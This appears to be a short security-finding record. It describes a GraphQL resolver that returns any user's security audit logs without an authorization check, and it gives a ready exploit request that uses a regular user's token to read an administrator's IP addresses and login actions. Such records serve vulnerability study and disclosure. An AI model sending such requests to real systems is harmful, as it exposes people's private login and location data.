diagnosis: The federated User.securityAuditLogs field resolver queries security audit entries for parent.id without ensuring that context.user is either the target user or an administrator with compliance audit permissions. Any authenticated user requesting the federated User entity can append securityAuditLogs to inspect other users' login histories and IP addresses.
exploit_request:
POST /graphql HTTP/1.1
Host: api.identity-federation.io
Authorization: Bearer <regular_user_token>
Content-Type: application/json

{"query": "query { user(id: \"usr_admin_001\") { id securityAuditLogs { ipAddress action timestamp } } }"}
